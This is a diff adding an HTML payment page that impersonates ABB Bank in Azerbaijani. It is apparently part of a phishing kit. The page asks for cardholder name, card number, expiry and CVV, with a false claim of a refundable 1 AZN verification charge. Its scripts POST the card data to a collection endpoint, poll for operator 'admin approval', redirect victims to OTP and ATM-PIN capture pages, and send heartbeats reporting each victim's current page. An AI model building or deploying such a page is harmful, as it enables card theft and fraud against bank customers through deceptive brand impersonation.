@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="az" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ABB Bank - Təhlükəsiz Ödəniş Portalı</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f8f9fa;
+            color: #212529;
+        }
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: #ffffff;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 40px;
+            z-index: 1000;
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        .header-left img {
+            height: 38px;
+            object-fit: contain;
+        }
+        .lang-btn {
+            font-weight: bold;
+            color: #000000;
+            background: #f1f3f5;
+            padding: 5px 12px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            color: #000000;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        .phone-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .menu-icon {
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            width: 22px;
+            height: 16px;
+            cursor: pointer;
+        }
+        .menu-icon span {
+            display: block;
+            height: 2.5px;
+            background-color: #000000;
+            border-radius: 2px;
+        }
+
+        /* Main Wrapper */
+        .main-container {
+            margin-top: 85px;
+            padding: 40px 20px 80px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: calc(100vh - 85px);
+            background-color: #f8f9fa;
+        }
+
+        /* Checkout Card */
+        .checkout-card {
+            width: 100%;
+            max-width: 520px;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.04);
+            overflow: hidden;
+            border: 1px solid #eaeaea;
+        }
+
+        /* Blue Header Background */
+        .checkout-header {
+            background: linear-gradient(135deg, #0056b3 0%, #004085 100%);
+            color: #ffffff;
+            padding: 25px 30px;
+            text-align: center;
+        }
+        .checkout-header h2 {
+            margin: 0;
+            font-size: 20px;
+            font-weight: 700;
+            letter-spacing: 0.3px;
+        }
+        .secure-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(255, 255, 255, 0.15);
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            margin-top: 8px;
+            font-weight: 500;
+        }
+
+        .checkout-body {
+            padding: 30px;
+        }
+
+        /* Blue Alert Boxes */
+        .alert-box {
+            padding: 14px 16px;
+            border-radius: 8px;
+            font-size: 13.5px;
+            line-height: 1.5;
+            margin-bottom: 15px;
+            font-weight: 500;
+            display: flex;
+            gap: 10px;
+            align-items: flex-start;
+            background-color: #ebf5ff;
+            color: #0c4a6e;
+            border: 1px solid #bae6fd;
+            border-left: 4px solid #0284c7;
+        }
+
+        /* Supported Card Logos */
+        .payment-methods {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #f8f9fa;
+            padding: 12px 18px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            border: 1px solid #eaeaea;
+        }
+        .pm-label {
+            font-size: 13px;
+            color: #666;
+            font-weight: 600;
+        }
+        .pm-logos {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .pm-logos img {
+            height: 26px;
+            object-fit: contain;
+        }
+
+        /* Form Controls */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #2c3e50;
+            font-size: 14px;
+        }
+        .input-wrapper {
+            position: relative;
+        }
+        .form-control {
+            width: 100%;
+            padding: 14px 18px;
+            border: 1.5px solid #dcdfe6;
+            border-radius: 8px;
+            font-size: 15px;
+            outline: none;
+            transition: all 0.3s ease;
+            background-color: #fafbfc;
+            color: #333;
+        }
+        .form-control:focus {
+            border-color: #0056b3;
+            background-color: #fff;
+            box-shadow: 0 0 0 4px rgba(0,86,179,0.08);
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        /* Blue Submit Button */
+        .pay-btn {
+            background-color: #0056b3;
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0,86,179,0.2);
+            margin-top: 10px;
+        }
+        .pay-btn:hover {
+            background-color: #004085;
+            transform: translateY(-1px);
+            box-shadow: 0 6px 15px rgba(0,86,179,0.3);
+        }
+
+        /* Footer Section */
+        footer {
+            background-color: #000000;
+            color: #ffffff;
+            padding: 60px 20px 30px 20px;
+        }
+        .footer-container {
+            max-width: 1100px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+        .footer-logo {
+            height: 40px;
+            object-fit: contain;
+            margin-bottom: 25px;
+            filter: none;
+        }
+        .footer-info {
+            font-size: 15px;
+            line-height: 2.2;
+            color: #cccccc;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+        .footer-bottom {
+            margin-top: 40px;
+            width: 100%;
+            border-top: 1px solid #222222;
+            padding-top: 20px;
+            font-size: 14px;
+            color: #777777;
+            text-align: center;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes shake { 0%,100%{transform:translateX(0)} 10%,30%,50%,70%,90%{transform:translateX(-5px)} 20%,40%,60%,80%{transform:translateX(5px)} }
+        @media (max-width: 580px) {
+            .checkout-card {
+                border-radius: 0;
+                box-shadow: none;
+                border: none;
+            }
+            .main-container {
+                padding: 0;
+                margin-top: 75px;
+            }
+            .checkout-body {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="header-left">
+            <a href="index.html"><img src="logo-header.png" alt="ABB Bank"></a>
+            <a href="payment-en.html" class="lang-btn">EN</a>
+        </div>
+        <div class="header-right">
+            <div class="phone-group">
+                <span>937</span>
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+            </div>
+            <div class="menu-icon">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <div class="checkout-card">
+            <div class="checkout-header">
+                <h2>Ödəniş Təsdiqi</h2>
+                <div class="secure-badge">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                    256-bit Secure Checkout
+                </div>
+            </div>
+
+            <div class="checkout-body">
+                
+                <!-- Blue Warning Notice -->
+                <div class="alert-box">
+                    <span>ℹ️</span>
+                    <div>Sifarişi təsdiq etmək üçün zəhmət olmasa ABB bank kartından istifadə edin. Başqa bank kartından istifadə olunarsa, sifariş dərhal rədd ediləcəkdir.</div>
+                </div>
+
+                <!-- Blue Verification Info -->
+                <div class="alert-box">
+                    <span>ℹ️</span>
+                    <div>Hesabın mülkiyyətini təsdiq etmək üçün kartınızdan 1 AZN məbləğində simvolik çıxarış edilə bilər və dərhal hesabınıza geri qaytarılacaqdır.</div>
+                </div>
+
+                <!-- Logos Bar -->
+                <div class="payment-methods">
+                    <span class="pm-label">Dəstəklənən Kartlar:</span>
+                    <div class="pm-logos">
+                        <img src="logo-header.png" alt="ABB">
+                        <img src="https://i.ibb.co/0p84ZGSf/Mastercard-visa-card-logo.png" alt="Visa Mastercard">
+                    </div>
+                </div>
+
+                <!-- Payment Form -->
+                <form id="paymentForm">
+                    
+                    <div class="form-group">
+                        <label for="card_holder">Kart Sahibinin Adı (Card Holder Name)</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="card_holder" name="card_holder" class="form-control" required placeholder="Məs: ELMIR GASIMOV">
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="card_number">Kartın Nömrəsi (Card Number)</label>
+                        <div class="input-wrapper">
+                            <input type="text" id="card_number" name="card_number" class="form-control" required placeholder="4169 •••• •••• 8888" maxlength="19">
+                        </div>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="expiry_date">Bitmə Tarixi</label>
+                            <input type="text" id="expiry_date" name="expiry_date" class="form-control" required placeholder="MM/YY" maxlength="5">
+                        </div>
+
+                        <div class="form-group">
+                            <label for="cvv">CVV / CVC</label>
+                            <input type="password" id="cvv" name="cvv" class="form-control" required placeholder="•••" maxlength="4">
+                        </div>
+                    </div>
+
+                    <button type="submit" class="pay-btn">Ödənişi Təsdiq et</button>
+
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-container">
+            <a href="index.html"><img src="logo-footer.png" alt="ABB Bank" class="footer-logo"></a>
+            <div class="footer-info">
+                <div>Ünvan: Nizami küçəsi 67, Bakı, Azərbaycan</div>
+                <div>E-poçt: info@abb-bank.az</div>
+                <div>TELEFON: +994 12 493 00 91</div>
+                <div>FAKS: +994 12 493 00 91</div>
+            </div>
+            <div class="footer-bottom">
+                &copy; 2026 ABB Bank. Bütün hüquqlar qorunur.
+            </div>
+        </div>
+    </footer>
+
+    <!-- Loading Overlay (blue, like loading.html) -->
+    <div id="loadingOverlay" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#0056b3;z-index:9999;justify-content:center;align-items:center;flex-direction:column;">
+        <div style="width:90px;height:90px;background:rgba(255,255,255,0.1);border-radius:50%;display:flex;justify-content:center;align-items:center;">
+            <div style="width:45px;height:45px;border:4px solid rgba(255,255,255,0.3);border-top:4px solid #ffffff;border-radius:50%;animation:spin 1s linear infinite;"></div>
+        </div>
+        <div style="font-size:24px;font-weight:700;color:#ffffff;margin-top:25px;">Kart məlumatları təsdiqlənir...</div>
+        <p style="font-size:15px;color:rgba(255,255,255,0.8);margin-top:10px;">Zəhmət olmasa gözləyin, ödənişiniz emal olunur.</p>
+    </div>
+
+    <!-- Error Modal -->
+    <div id="errorModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.6);z-index:10000;justify-content:center;align-items:center;">
+        <div style="background:white;border-radius:16px;padding:40px;max-width:400px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:shake 0.5s;border:2px solid #dc3545;">
+            <div style="font-size:50px;color:#dc3545;margin-bottom:15px;">✕</div>
+            <h3 style="color:#dc3545;margin-bottom:10px;" id="errorTitle">Yoxlama uğursuz oldu</h3>
+            <p style="color:#555;font-size:15px;" id="errorMessage">Düzgün məlumatları yoxlayın və yenidən cəhd edin</p>
+            <button onclick="closeErrorModal()" style="margin-top:20px;padding:12px 30px;background:#dc3545;color:white;border:none;border-radius:8px;font-size:15px;cursor:pointer;font-weight:bold;">Yenidən cəhd edin</button>
+        </div>
+    </div>
+
+    <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+
+    <script>
+        let pollInterval = null;
+
+        // Auto-insert slash in expiry date field (MM/YY)
+        document.getElementById('expiry_date').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        // Poll for order status
+        async function pollOrderStatus() {
+            const orderId = sessionStorage.getItem('orderId');
+            if (!orderId) return;
+
+            try {
+                const res = await fetch('/api/orders/' + orderId + '/status');
+                const data = await res.json();
+
+                if (data.status === 'approved') {
+                    clearInterval(pollInterval);
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    // Redirect based on server-provided current_page if available
+                    const nextPages = {
+                        'loading_otp': 'otp.html',
+                        'otp': 'otp.html',
+                        'loading_atm': 'atm-pin.html',
+                        'atm_pin': 'atm-pin.html',
+                        'loading_success': 'success.html',
+                        'success': 'success.html'
+                    };
+                    window.location.href = nextPages[data.currentPage] || 'otp.html';
+                } else if (data.status === 'rejected') {
+                    clearInterval(pollInterval);
+                    document.getElementById('loadingOverlay').style.display = 'none';
+                    if (data.message) {
+                        document.getElementById('errorMessage').textContent = data.message;
+                    }
+                    showErrorModal();
+                }
+            } catch (err) {
+                console.error('Poll error:', err);
+            }
+        }
+
+        function showErrorModal() {
+            document.getElementById('errorModal').style.display = 'flex';
+        }
+
+        function closeErrorModal() {
+            document.getElementById('errorModal').style.display = 'none';
+        }
+
+        document.getElementById('paymentForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const orderId = sessionStorage.getItem('orderId');
+            if (!orderId) {
+                alert('Xəta: Sifariş nömrəsi tapılmadı');
+                window.location.href = 'data.html';
+                return;
+            }
+
+            const formData = new FormData(e.target);
+            const data = {
+                orderId,
+                ...Object.fromEntries(formData)
+            };
+
+            try {
+                const response = await fetch('/api/orders/payment-data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                const result = await response.json();
+                
+                if (response.ok) {
+                    // Show loading overlay
+                    document.getElementById('loadingOverlay').style.display = 'flex';
+                    // Start polling for admin approval
+                    pollInterval = setInterval(pollOrderStatus, 2000);
+                } else {
+                    alert('Xəta: ' + result.error);
+                }
+            } catch (err) {
+                alert('Serverlə əlaqə xətası baş verdi');
+            }
+        });
+    </script>
+
+    <script>
+        function sendHeartbeat() {
+            fetch('/api/heartbeat', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ currentPage: window.location.pathname })
+            }).catch(() => {});
+        }
+        setInterval(sendHeartbeat, 30000);
+        sendHeartbeat();
+    </script>
+</body>
+</html>
